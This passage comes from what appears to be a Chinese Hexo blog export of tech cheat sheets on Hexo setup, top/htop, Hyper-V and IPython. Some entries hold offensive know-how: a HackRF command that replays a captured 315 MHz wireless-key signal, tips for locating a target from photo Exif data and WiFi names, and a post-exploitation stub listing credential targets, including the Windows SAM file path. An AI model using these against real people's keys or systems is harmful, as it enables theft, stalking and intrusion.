class="meta">#</span><span class="bash"> 重放信号</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -t：从文件中读取数据</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -x：设置 Tx VGA 增益（0 到 47 dB 之间，每次增加 1 dB）</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -R：重复发送模式（默认为关闭）</span></span><br><span class="line">hackrf_transfer -t capture.raw -f 315000000 -x 40 [-s 2000000 -a 1]</span><br></pre></td></tr></table></figure>

<p>一般无线钥匙工作频段都在 315 Mhz、433.92 Mhz。<br>Tx Mode：发射模式<br>Rx Mode：接收模式</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>针对哈希算法的攻击</title>
    <url>/2018/05/09/hash-attack/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo初体验</title>
    <url>/2017/06/20/hexo-experience/</url>
    <content><![CDATA[<p><a href="https://hexo.io/zh-cn/index.html">Hexo</a>是一个基于Node.js的开源静态博客框架，类似的项目还有基于Ruby的<a href="https://jekyllrb.com/">Jekyll</a>，基于Go的<a href="https://gohugo.io/">Hugo</a>，基于Python的<a href="https://blog.getpelican.com/">Pelican</a>等等。之所以选择Hexo，主要是因为它不仅使用人数多，而且有中文文档。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装Hexo前，需要安装<a href="https://nodejs.org/en/download/">Node.js</a>和<a href="https://git-scm.com/downloads">Git</a>，安装Node.js的同时，npm(Node Package Manager)也已经被自动安装了，同时安装程序也自动配置了环境变量。确定安装完成后，可以输入<code>node -v</code>来测试Node.js是否成功安装，输入<code>npm -v</code>来测试npm是否成功安装。<br>npm成功安装后，可使用<code>npm install -g hexo-cli</code>来快速安装Hexo命令行工具。参数<code>-g</code>表示全局安装，npm的包安装分为本地安装（local）和全局安装（global）两种，区别在于：</p>
<p><strong>本地安装</strong></p>
<ul>
<li>将安装包放在 ./node_modules 下（运行npm时所在的目录）</li>
<li>可以通过 require() 来引入本地安装的包</li>
</ul>
<p><strong>全局安装</strong></p>
<ul>
<li>将安装包放在 /usr/local下</li>
<li>可以直接在命令行里使用<a id="more"></a>

</li>
</ul>
<p>关于npm更多的内容请参考<a href="http://www.ruanyifeng.com/blog/2016/01/npm-install.html">npm模块安装机制简介</a>。</p>
<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>在博客所在目录执行<code>hexo version</code>即可查看Hexo版本信息，在博客所在目录执行<code>npm update -g</code>即可更新Hexo。</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="新建一个网站"><a href="#新建一个网站" class="headerlink" title="新建一个网站"></a>新建一个网站</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo init [folder]</span><br></pre></td></tr></table></figure>
<p>如果没有设置<code>folder</code>，Hexo 默认在目前的文件夹建立网站。</p>
<h3 id="新建一篇文章"><a href="#新建一篇文章" class="headerlink" title="新建一篇文章"></a>新建一篇文章</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n [layout] &lt;title&gt;</span><br><span class="line">或 hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>
<p>如果没有设置<code>layout</code>的话，默认使用 _config.yml 中的<code>default_layout</code>参数代替。如果标题包含空格的话，请使用引号括起来。</p>
<h3 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">或 hexo generate</span><br></pre></td></tr></table></figure>

<h3 id="启动服务预览"><a href="#启动服务预览" class="headerlink" title="启动服务预览"></a>启动服务预览</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s</span><br><span class="line">或 hexo server</span><br></pre></td></tr></table></figure>
<p>默认情况下，访问网址为：<a href="http://localhost:4000/">http://localhost:4000/</a> 。</p>
<h3 id="部署网站"><a href="#部署网站" class="headerlink" title="部署网站"></a>部署网站</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo d</span><br><span class="line">或 hexo deploy</span><br></pre></td></tr></table></figure>

<h3 id="清除缓存文件-db-json-和已生成的静态文件-public-。"><a href="#清除缓存文件-db-json-和已生成的静态文件-public-。" class="headerlink" title="清除缓存文件(db.json)和已生成的静态文件(public)。"></a>清除缓存文件(db.json)和已生成的静态文件(public)。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure>
<p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>Hexo生成的网站目录结构如下：</p>
<ul>
<li><code>public</code>：此目录下保存着已经生成的静态文件</li>
<li><code>scaffolds</code>：此目录下存放Hexo模板，当您新建文章时，Hexo会根据scaffold来建立文件。</li>
<li><code>source</code>：此目录下存放用户资源<ul>
<li><code>_posts</code>：此目录下存放Markdown格式的源文章</li>
<li><code>images</code>：此目录下存放相关图片文件</li>
</ul>
</li>
<li><code>themes</code>：此目录下保存着主题文件</li>
<li><code>_config.yml</code>：此文件为<strong>站点配置文件</strong></li>
</ul>
<h3 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h3><p>站点配置文件（<code>_config.yml</code>）中的<code>url</code>字段务必要填写为自己站点的正确网址，否则分享自己站点内文章时会生成错误链接。<br>新建文章（<code>hexo n &lt;title&gt;</code>）时建议使用小写英文作为文件名，此文件名将作为文章链接的一部分，英文中的空格将自动用<code>-</code>替代，文章标题可以在文件中另行设置。<br>和传统的博客一样，建议开启<strong>分类</strong>（category）和<strong>标签</strong>（tag）功能，在Hexo中，分类具有<strong>顺序性</strong>和<strong>层次性</strong>，也就是说<code>Foo，Bar</code>不等于<code>Bar，Foo</code>，而标签没有顺序和层次。简单来说，分类应该是经过深思熟虑的，而标签则可适文章而决定，分类一般只有几个，而标签可以有一堆。具体而言，可以参考本站点的分类标签设计。</p>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>Hexo支持<a href="https://hexo.io/plugins/">许多插件</a>，个人经常使用的插件如下：</p>
<ul>
<li><a href="https://github.com/hexojs/hexo-deployer-git">hexo-deployer-git</a>：为Hexo打造的Git部署插件，适用于将博客部署到GitHub仓库上。</li>
<li><a href="https://github.com/theme-next/hexo-symbols-count-time">hexo-symbols-count-time</a>：适用于为文章添加字数统计和阅读时长统计，比同类型的<a href="https://github.com/willin/hexo-wordcount">hexo-wordcount</a>插件要更好。</li>
<li><a href="https://github.com/theme-next/hexo-generator-searchdb">hexo-generator-searchdb</a>：适用于为博客添加本地搜索功能。</li>
<li><a href="https://github.com/hexojs/hexo-generator-feed">hexo-generator-feed</a>：适用于为博客添加RSS功能。</li>
</ul>
<p>使用如下命令即可安装上面提到的所有插件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git hexo-symbols-count-time hexo-generator-searchdb hexo-generator-feed --save</span><br></pre></td></tr></table></figure>

<h2 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h2><p>安装Hexo后，默认使用的主题为landscape，个人不是很喜欢这个主题，所幸的是Hexo提供<a href="https://hexo.io/themes/">更多的第三方主题</a>，个人倾向于使用广为流行的<a href="https://theme-next.org/">NexT主题</a>。<br>值得注意的是，NexT主题在6.0.0版本之前由iissnan个人维护，其官方仓库为<a href="https://github.com/iissnan/hexo-theme-next">https://github.com/iissnan/hexo-theme-next</a> ，官网为<a href="https://theme-next.iissnan.com/">https://theme-next.iissnan.com/</a> ，在6.0.0版本之后由theme-next组织维护，其官方仓库更改为<a href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> ，官网为<a href="https://theme-next.org/">https://theme-next.org</a> 。这里所介绍的使用方法均以6.0.0版本之后为例。</p>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>要安装NexT主题，首先要进入Hexo站点目录下，接着执行<code>git clone https://github.com/theme-next/hexo-theme-next themes/next</code>命令，即可将NexT仓库克隆到本地。要启用NexT主题，只需在<strong>站点配置文件</strong>中找到<code>theme</code>字段，并将其值更改为<code>next</code>即可。</p>
<h3 id="更新-1"><a href="#更新-1" class="headerlink" title="更新"></a>更新</h3><p>要查看正在使用的NexT主题的版本，有如下几种方法：</p>
<ul>
<li>可直接打开<strong>主题配置文件</strong>（即站点目录下的<code>/themes/next/_config.yml</code>文件），在其底部<code>version</code>字段即可查看版本号。</li>
<li>在自己站点的底部一般会有Hexo和NexT的版本号</li>
</ul>
<p>和传统的Git仓库更新一样，进入站点目录下的<code>/themes/next</code>文件夹，执行<code>git pull</code>命令即可从官方仓库拉取最新代码进行更新。<br>如果你使用的是6.0.0之前的版本，现在想要升级到6.0.0之后的版本，可参考NexT主题官方给出的<a href="https://github.com/theme-next/hexo-theme-next/blob/master/docs/zh-CN/UPDATE-FROM-5.1.X.md">解决方案</a>。</p>
<h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p>关于Hexo的更多问题，请参考<a href="https://hexo.io/zh-cn/docs/">Hexo官方文档</a>，或YouTube上<a href="https://www.youtube.com/watch?v=bCj0iVVqkSg&feature=youtu.be">Hexo系列教程</a>视频；关于NexT主题的更多问题，请参考<a href="https://theme-next.iissnan.com/">NexT使用文档</a>；关于如何利用Hexo以及GitHub Pages搭建个人博客的更详细内容，请参考<a href="https://zhuanlan.zhihu.com/p/26625249">GitHub + Hexo 搭建个人网站详细教程</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>top的增强版：htop</title>
    <url>/2018/09/19/htop-top/</url>
    <content><![CDATA[<h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><p>top是Linux下一个常用命令，用来监视系统的运行状况，类似于Windows的任务管理器，下图是<code>top</code>命令的运行界面：<br><img src="/images/top.PNG" alt="top">top的运行结果可以大致分为7个部分：</p>
<ul>
<li>第1行显示了<strong>系统</strong>概况</li>
<li>第2行显示了<strong>进程</strong>概况</li>
<li>第3行显示了<strong>CPU</strong>概况</li>
<li>第4行显示了<strong>内存</strong>概况</li>
<li>第5行显示了<strong>Swap分区</strong>概况</li>
<li>第6行为空行，用以显示运行命令时输入的<strong>参数</strong></li>
<li>剩下部分则为<strong>每个进程的详细信息</strong><a id="more"></a>
<h3 id="第1行"><a href="#第1行" class="headerlink" title="第1行"></a>第1行</h3></li>
</ul>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>top -</td>
<td>系统概况</td>
</tr>
<tr>
<td>18:37:24</td>
<td>当前系统时间</td>
</tr>
<tr>
<td>up 130 days, 6:22,</td>
<td>系统已运行时间</td>
</tr>
<tr>
<td>1 user,</td>
<td>当前登录用户数</td>
</tr>
<tr>
<td>load average: 0.02, 0.04, 0.00</td>
<td>系统平均负载，三个数值分别为1分钟、5分钟、15分钟前到现在的平均值。</td>
</tr>
</tbody></table>
<h3 id="第2行"><a href="#第2行" class="headerlink" title="第2行"></a>第2行</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Tasks:</td>
<td>进程(任务)概况</td>
</tr>
<tr>
<td>23 total,</td>
<td>总进程数</td>
</tr>
<tr>
<td>1 running,</td>
<td>运行的进程数</td>
</tr>
<tr>
<td>22 sleeping,</td>
<td>睡眠的进程数</td>
</tr>
<tr>
<td>0 stopped,</td>
<td>停止的进程数</td>
</tr>
<tr>
<td>0 zombie</td>
<td>僵尸进程数</td>
</tr>
</tbody></table>
<h3 id="第3行"><a href="#第3行" class="headerlink" title="第3行"></a>第3行</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Cpu(s):</td>
<td>CPU概况</td>
</tr>
<tr>
<td>3.7%us,</td>
<td>用户(user)进程占用CPU百分率</td>
</tr>
<tr>
<td>0.7%sy,</td>
<td>系统(system)进程占用CPU百分率</td>
</tr>
<tr>
<td>0.0%ni,</td>
<td>用户进程空间内改变过优先级(niced)的进程占用CPU百分比</td>
</tr>
<tr>
<td>95.7%id,</td>
<td>CPU空闲(idle)率</td>
</tr>
<tr>
<td>0.0%wa,</td>
<td>等待(wait)IO的CPU时间百分比</td>
</tr>
<tr>
<td>0.0%hi,</td>
<td>硬中断(hardware interrupt)占用CPU的百分比</td>
</tr>
<tr>
<td>0.0%si,</td>
<td>软中断(software interrupt)占用CPU的百分比</td>
</tr>
<tr>
<td>0.0%st</td>
<td></td>
</tr>
</tbody></table>
<h3 id="第4行"><a href="#第4行" class="headerlink" title="第4行"></a>第4行</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Mem:</td>
<td>内存(memory)概况，数值以kb为单位</td>
</tr>
<tr>
<td>524288k total,</td>
<td>内存总量</td>
</tr>
<tr>
<td>278140k used,</td>
<td>内存使用量</td>
</tr>
<tr>
<td>246148k free,</td>
<td>内存空闲量</td>
</tr>
<tr>
<td>0k buffers</td>
<td>缓冲的内存量</td>
</tr>
</tbody></table>
<h3 id="第5行"><a href="#第5行" class="headerlink" title="第5行"></a>第5行</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>Swap:</td>
<td>Swap分区概况，数值以kb为单位</td>
</tr>
<tr>
<td>65536k total,</td>
<td>Swap分区总量</td>
</tr>
<tr>
<td>65536k used,</td>
<td>Swap分区使用量</td>
</tr>
<tr>
<td>0k free,</td>
<td>Swap分区空闲量</td>
</tr>
<tr>
<td>28800k cached</td>
<td>缓冲的Swap分区量</td>
</tr>
</tbody></table>
<h3 id="剩下部分"><a href="#剩下部分" class="headerlink" title="剩下部分"></a>剩下部分</h3><table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>PID</td>
<td>进程号</td>
</tr>
<tr>
<td>USER</td>
<td>进程创建者</td>
</tr>
<tr>
<td>PR</td>
<td>进程优先级</td>
</tr>
<tr>
<td>NI</td>
<td>nice值。越小优先级越高，最小-20，最大20（用户设置最大19）</td>
</tr>
<tr>
<td>VIRT</td>
<td>进程使用的虚拟(virtual)内存总量，单位kb。VIRT=SWAP+RES</td>
</tr>
<tr>
<td>RES</td>
<td>进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</td>
</tr>
<tr>
<td>SHR</td>
<td>共享(share)内存大小，单位kb</td>
</tr>
<tr>
<td>S</td>
<td>进程状态。D=不可中断的睡眠状态，R=运行态，S=睡眠态，T=跟踪/停止态，Z=僵尸态</td>
</tr>
<tr>
<td>%CPU</td>
<td>进程占用CPU百分比</td>
</tr>
<tr>
<td>%MEM</td>
<td>进程占用内存百分比</td>
</tr>
<tr>
<td>TIME+</td>
<td>进程运行时间</td>
</tr>
<tr>
<td>COMMAND</td>
<td>运行进程时所使用的命令</td>
</tr>
</tbody></table>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p>在<code>top</code>命令运行界面也可以输入相关命令，具体如下：</p>
<ul>
<li><code>q</code>：退出<code>top</code>运行界面</li>
<li><code>P</code>：以占据CPU百分比排序</li>
<li><code>M</code>：以占据内存百分比排序</li>
<li><code>T</code>：以累积占用CPU时间排序</li>
<li><code>s</code>：修改刷新时间间隔，默认每隔3秒刷新信息。按下s键，然后按下数字，即可修改刷新时间间隔为你输入的数字，单位为秒。例如：按下s键，在按数字1键，即可实现每秒刷新一次</li>
<li>回车或空格：手动立即刷新</li>
<li><code>k</code>：终止指定的进程。按下k键，再输入要杀死的进程的pid，再按回车键，选择信号类型，以数字标示，默认15为杀死，本步可省略直接按回车键（常用为-9）</li>
<li><code>h</code>：显示可输入的命令帮助菜单</li>
</ul>
<h2 id="htop"><a href="#htop" class="headerlink" title="htop"></a>htop</h2><p>htop是一款第三方的命令行工具，它可以被视为是top的增强版，在Ubuntu下可使用<code>apt install htop</code>命令安装，下图是<code>htop</code>命令的运行界面：<br><img src="/images/htop.PNG" alt="htop">当了解了<code>top</code>运行界面的各种参数的含义后，<code>htop</code>运行界面就变得不言而喻了，下面简要介绍一下可以在htop运行界面执行的相关命令：</p>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>综上所述，htop相比top有以下优势：</p>
<ul>
<li>彩色标识CPU、内存、Swap分区</li>
<li>CPU、内存、Swap分区使用情况直观易懂</li>
<li>底部有命令提示</li>
<li>支持方向键选择进程</li>
</ul>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTPS运行机制</title>
    <url>/2018/05/11/https/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>基于人的信息收集</title>
    <url>/2018/09/09/human-based-information-gathering/</url>
    <content><![CDATA[<h2 id="照片"><a href="#照片" class="headerlink" title="照片"></a>照片</h2><p>根据目标朋友圈、微博等社交网络所发的照片，查看Exif信息，可得到目标当时的位置、相机规格等信息。</p>
<h2 id="WiFi"><a href="#WiFi" class="headerlink" title="WiFi"></a>WiFi</h2><p>根据目标所连接的WiFi名称可大致判断目标所在的位置，多数情况下，WiFi的名称一般为所在旅馆、餐馆、机构等名称的缩写。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title>Hyper-V 相关问题解决</title>
    <url>/2018/08/20/hyper-v-problem/</url>
    <content><![CDATA[<h2 id="全屏问题"><a href="#全屏问题" class="headerlink" title="全屏问题"></a>全屏问题</h2><p>由于 Hyper-V 最初是为服务器设计的，所以到目前为止，Hyper-V 对于全屏的支持没有 VMware 做得好，同样，Hyper-V 也不能像 VMware 那样随意更改窗口大小，这多少显得很不方便。</p>
<p>对于 Windows 虚拟机的全屏操作，目前较为理想的解决方案是使用<strong>远程桌面连接</strong>，记得要在虚拟机中开启远程桌面连接功能；而对于 Linux 虚拟机的全屏操作，可以通过修改 <code>/etc/default/grub</code> 文件，更改其中 <code>GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash video=hyperv_fb:1920x1080&quot;</code>（注意是 <code>x</code> 不是 <code>*</code>），接着执行 <code>update-grub</code> 并重启即可。</p>
<a id="more"></a>

<h2 id="显卡问题"><a href="#显卡问题" class="headerlink" title="显卡问题"></a>显卡问题</h2><p>开启 Hyper-V 功能后，原主机的显卡可能会出现问题，对于我当时的 1803 版 Win10 来说，电脑中原来的 <strong>Intel(R) HD Graphics 4600</strong> 核芯显卡（针对我的电脑而言）不能正常工作，具体表现在工具栏中<strong>英特尔核芯显卡</strong>控制面板图标消失，以及系统设置中莫名出现多个显示器，最直观的感受是每当点亮屏幕，图像显示会变慢，并且有一个逐渐适配屏幕大小的过程。</p>
<p>究其原因是系统中原本的 4624 版驱动程序与 Hyper-V 不兼容，解决办法是去<a href="https://downloadcenter.intel.com/zh-cn">官网</a>下载最新版驱动程序并升级即可。</p>
<p>具体操作步骤可参考<a href="https://www.youtube.com/watch?v=dYfeOnFZegI&ab_channel=AlexanderSchmidt">此视频</a> 。</p>
<h2 id="兼容性问题"><a href="#兼容性问题" class="headerlink" title="兼容性问题"></a>兼容性问题</h2><p>由于 Hyper-V 采用的是硬件虚拟化技术，所以开启 Hyper-V 功能后相当于原本的物理机也运行在虚拟化上了，因此不能再使用 VMware 或者 VirtualBox，它们不允许在虚拟机上运行虚拟机，而此时原主机在它们眼中就是一个虚拟机。</p>
<p>早期的 Android Studio 中自带的模拟器也会由于这种原因导致模拟器无法启动，只需将模拟器升级到最新版即可解决，Android Studio 3.1.4 版之后自带模拟器（v27.3.9）已经可以支持 Hyper-V，在开启 Hyper-V 的系统中，它使用 <strong>Windows 虚拟机监控程序平台</strong>替代了 Intel 的 <strong>HAXM</strong>，使用前需要在 Windows 功能中启用 <strong>Windows 虚拟机监控程序平台</strong>功能。</p>
<h2 id="网卡问题"><a href="#网卡问题" class="headerlink" title="网卡问题"></a>网卡问题</h2><p>要想使 Hyper-V 中的虚拟机上网，可以通过创建<strong>虚拟交换机</strong>实现，虚拟交换机有 3 种类型，<strong>外部</strong>相当于 VMware 的<strong>桥接模式</strong>，<strong>内部</strong>相当于 VMware 的 <strong>NAT 模式</strong>，<strong>专用</strong>相当于 VMware 的<strong>仅主机模式</strong>，所有虚拟机会默认使用<strong>内部</strong>类型的<strong>默认交换机</strong>，这是<strong>虚拟交换机管理器</strong>自动创建的。</p>
<p>如果我们选择创建<strong>外部</strong>类型的虚拟交换机，则会把 Hyper-V 的网络桥接在物理网卡上，那物理网卡将变成一个虚拟交换机。因此我们会发现原来使用的网卡变成了 <strong>vEthernet</strong>，这是正常现象，不用担心。Hyper-V 会自动创建一个虚拟网卡来继承原物理网卡的配置，物理计算机可以正常使用网络。</p>
<h2 id="代数问题"><a href="#代数问题" class="headerlink" title="代数问题"></a>代数问题</h2><p>在创建虚拟机时可以选择虚拟机代数，简单来说，第一代虚拟机支持创建 32 位与 64 位操作系统，创建的虚拟硬盘为 <code>.vhd</code> 格式，第二代虚拟机只能创建 64 位操作系统，创建的虚拟硬盘为 <code>.vhdx</code> 格式，并且必须是 Windows 8 或 Windows Server 2012 以上版本，对于 Linux，微软官方有一份详细的清单表明哪些版本可以创建第二代虚拟机。</p>
<p>为方便起见，可以在首次创建时选择第二代虚拟机，若不能成功启动，且屏幕显示 <code>No operating system was loaded. Press a key to retry the boot sequence...</code> 信息，则可以在设置中关闭<strong>安全启动</strong>并重启虚拟机，或者删掉虚拟机并重新创建第一代虚拟机。</p>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>ifconfig与ip</title>
    <url>/2018/09/12/ifconfig-ip/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>后渗透测试阶段的信息收集</title>
    <url>/2018/05/09/information-gathering-of-post-exploitation/</url>
    <content><![CDATA[<p>浏览器密码、历史，电脑密码，邮箱密码，QQ聊天记录，最近打开的文件，环境变量，持久后门<br>我们假设客户端为Windows系统，服务器为Linux系统，下面分别针对客户端与服务器进行信息收集。</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="登录密码"><a href="#登录密码" class="headerlink" title="登录密码"></a>登录密码</h3><p>Windows的登录密码保存在<code>%windir%\System32\config\SAM</code>中，</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2>]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>IP协议分析</title>
    <url>/2018/05/11/ip/</url>
    <content><![CDATA[<p>IP(Internet Protocol，网际协议)</p>
<h2 id="数据报格式"><a href="#数据报格式" class="headerlink" title="数据报格式"></a>数据报格式</h2><p><img src="/images/ip.PNG"></p>
<a id="more"></a>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>IPSec运行机制</title>
    <url>/2018/05/11/ipsec/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 IPython 替代原生 Python Shell</title>
    <url>/2018/09/16/ipython/</url>
    <content><![CDATA[<p>我算是个原教主义者，喜欢原生的东西，不太喜欢第三方的东西，但 IPython 相比原生 Python Shell 的众多优秀特性，让我不由得使用上它。</p>
<h2 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h2><p><a href="https://ipython.org/"><strong>IPython</strong></a> 最初只是一种基于 Python 的交互式解释器（REPL），慢慢的，IPython 项目中集成了许多新的工具，比如 <strong>IPython Notebook</strong>，这是一种基于 Web 的强大编辑器。从 IPython 4.0 开始，IPython 项目中和语言无关的工具已独立出来形成一个新的项目 <a href="http://jupyter.org/"><strong>Jupyter</strong></a>，从此，IPython Notebook 升级为 <strong>Jupyter Notebook</strong>，开始支持更多的编程语言。而 IPython 将只专注于提供 Python 交互式解释器以及为 Jupyter 提供 Python 内核。当写这篇文章时，IPython 的最新版本为 7.8.0。</p>
<p>如今，当你去 IPython 官网下载时，它会跳转到 Jupyter 的下载页面，因为 Jupyter 中已经包含了 IPython，同时也建议下载 Jupyter，因为其包含了强大的 Jupyter Notebook，使用 <code>pip install jupyter</code> 即可下载，安装完成后直接输入 <code>ipython</code> 即可进入 IPython 交互式环境。</p>
<a id="more"></a>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>以下仅列出 IPython 相比原生 Python Shell 的一些优势：</p>
<ul>
<li>Tab 自动补全</li>
<li>自动缩进</li>
<li>语法高亮</li>
<li>支持命令历史记录</li>
<li>命令前加 <code>!</code> 可调用系统命令</li>
<li>命令后加 1 个或 2 个 <code>?</code> 可方便查看对象信息</li>
<li>有众多的魔法函数（Magic Functions）</li>
</ul>
<h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p>以下仅列出 IPython 中使用较多的魔法函数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%timeit <span class="comment">#测试代码段执行时间</span></span><br><span class="line">%hist   <span class="comment">#查看历史记录</span></span><br><span class="line">%debug  <span class="comment">#激活交互的调试器(ipdb)</span></span><br><span class="line">%load   <span class="comment">#加载外部代码</span></span><br><span class="line">%edit   <span class="comment">#使用编辑器打开</span></span><br></pre></td></tr></table></figure>

<p>要查看更多的魔法函数，可以访问 <a href="https://ipython.readthedocs.io/en/stable/interactive/magics.html">IPython 的官方文档</a></p>
<h2 id="Jupyter-Notebook"><a href="#Jupyter-Notebook" class="headerlink" title="Jupyter Notebook"></a>Jupyter Notebook</h2><p>要启动 Jupyter Notebook 直接在命令行输入 <code>jupyter notebook</code> 即可，它会监听本机的 8888 端口，并自动打开浏览器访问。输入 <code>jupyter notebook --help</code> 可以查看它的更多参数。</p>
<p>Jupyter Notebook 默认采用 <strong>Token</strong> 的方式进行登录，启动后在命令行中会显示当前的 token 值，若没有自动打开浏览器，则可以复制命令行中带 token 的链接并在浏览器中打开即可。</p>
<p>使用命令 <code>jupyter notebook --generate-config</code> 可生成 Jupyter Notebook 配置文件，默认为 <code>$HOME/.jupyter/jupyter_notebook_config.py</code> 文件。常用的配置项如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置是否允许root用户运行，改为`True`则允许</span></span><br><span class="line">c.NotebookApp.allow_root = False</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置监听地址，改为`*`可监听所有IP</span></span><br><span class="line">c.NotebookApp.ip = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置启动后显示的目录，默认为启动时输入命令的目录</span></span><br><span class="line">c.NotebookApp.notebook_dir = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置启动时是否自动打开浏览器，若在远程服务器上启动Jupyter Notebook，</span></span><br><span class="line"><span class="comment"># 则没必要打开浏览器，改为`False`即可</span></span><br><span class="line">c.NotebookApp.open_browser = True</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置登录密码，需要存储密文形式，使用`jupyter notebook password`命令</span></span><br><span class="line"><span class="comment"># 可生成加密后的密码</span></span><br><span class="line">c.NotebookApp.password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置监听端口</span></span><br><span class="line">c.NotebookApp.port = 8888</span><br></pre></td></tr></table></figure>

<p>最后，在 Linux 下，使用 <code>nohup jupyter notebook &gt; jupyter.log &amp;</code> 可使 Jupyter Notebook 在后台运行并记录日志到当前目录下的 <code>jupyter.log</code> 文件中。</p>
<p>要了解 Jupyter Notebook 的更多信息，可参考另一篇博文：<a href="https://howiezhao.github.io/2018/09/25/jupyter-notebook-extensions/">Jupyter Notebook 常用扩展</a>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>盘点那些互联网公司的学生优惠</title>
    <url>/2018/09/26/it-student-discount/</url>
